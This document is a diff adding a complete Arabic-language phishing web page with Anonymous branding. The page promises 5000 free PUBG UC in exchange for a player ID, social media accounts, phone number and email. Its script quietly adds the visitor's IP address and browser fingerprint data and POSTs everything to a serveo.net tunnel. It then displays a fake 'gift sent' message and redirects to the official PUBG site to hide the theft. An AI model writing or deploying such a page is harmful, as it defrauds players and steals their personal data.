@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Anonymous PUBG – هدية UC</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
+        body { background: #000; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { max-width: 500px; width: 100%; background: #111; border-radius: 10px; padding: 40px; border: 2px solid #0f0; box-shadow: 0 0 30px #0f0; }
+        h1 { color: #0f0; text-align: center; margin-bottom: 30px; font-size: 24px; }
+        .anonymous { text-align: center; color: #0f0; margin-bottom: 20px; font-size: 12px; }
+        input { width: 100%; padding: 15px; background: #222; border: 2px solid #0f0; border-radius: 5px; color: #0f0; margin-bottom: 20px; font-family: 'Courier New', monospace; }
+        input:focus { outline: none; box-shadow: 0 0 20px #0f0; }
+        .btn { width: 100%; padding: 15px; background: #0f0; color: #000; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; font-family: 'Courier New', monospace; }
+        .btn:hover { transform: scale(1.02); box-shadow: 0 0 30px #0f0; }
+        .btn:disabled { background: #333; color: #666; }
+        .terms { color: #0f0; margin: 20px 0; display: flex; align-items: center; gap: 10px; }
+        .footer { text-align: center; color: #0f0; margin-top: 20px; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="anonymous">We are Anonymous. We are Legion.</div>
+        <h1>🎮 استلام 5000 UC مجاناً</h1>
+        <div id="formContainer">
+            <input type="text" id="playerId" placeholder="معرف اللاعب في PUBG" required>
+            <input type="text" id="facebook" placeholder="رابط حساب الفيسبوك (اختياري)">
+            <input type="text" id="instagram" placeholder="حساب الانستغرام (اختياري)">
+            <input type="tel" id="phone" placeholder="رقم الهاتف (اختياري)">
+            <input type="email" id="email" placeholder="البريد الإلكتروني (اختياري)">
+            <div class="terms">
+                <input type="checkbox" id="terms">
+                <label>أوافق على الشروط والأحكام</label>
+            </div>
+            <button class="btn" onclick="submitInfo()" id="submitBtn" disabled>تأكيد واستلام الهدية</button>
+        </div>
+        <div class="footer">Expect us.</div>
+    </div>
+    <script>
+        document.getElementById('terms').addEventListener('change', function() {
+            document.getElementById('submitBtn').disabled = !this.checked;
+        });
+        
+        async function submitInfo() {
+            const data = {
+                playerId: document.getElementById('playerId').value,
+                facebook: document.getElementById('facebook').value,
+                instagram: document.getElementById('instagram').value,
+                phone: document.getElementById('phone').value,
+                email: document.getElementById('email').value,
+                ip: 'جاري...',
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => {
+                    data.ip = d.ip;
+                    return fetch('https://ztfodrrx.serveo.net/collect-info', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(data)
+                    });
+                })
+                .then(() => {
+                    document.getElementById('formContainer').innerHTML = '<h2 style="color:#0f0;">✅ تم إرسال الهدية!</h2><p style="color:#0f0;">سيتم تحويلك إلى الموقع الرسمي...</p>';
+                    setTimeout(() => {
+                        window.location.href = 'https://www.pubg.com';
+                    }, 2000);
+                });
+        }
+    </script>
+</body>
+</html>
